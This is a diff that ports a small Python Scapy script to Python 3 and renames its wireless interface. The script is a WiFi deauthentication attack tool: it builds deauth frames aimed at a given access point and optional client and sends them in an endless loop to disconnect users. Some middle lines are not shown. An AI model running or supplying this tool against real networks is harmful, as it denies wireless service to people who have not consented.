@@ -1,13 +1,13 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 
 import time
 from scapy.all import *
 
-iface = "mon0"
+iface = "wlp2s0mon"
 timeout = 1
 
 if len(sys.argv) < 2:
-    print sys.argv[0] + " <bssid> [client]"
+    print(sys.argv[0] + " <bssid> [client]")
     sys.exit(0)
 else:
     bssid = sys.argv[1]
@@ -23,6 +23,6 @@ pkt = RadioTap() / \
     Dot11Deauth(reason=3)
 
 while True:
-    print "Sending deauth to " + dest
+    print("Sending deauth to " + dest)
     sendp(pkt, iface=iface)
     time.sleep(timeout)
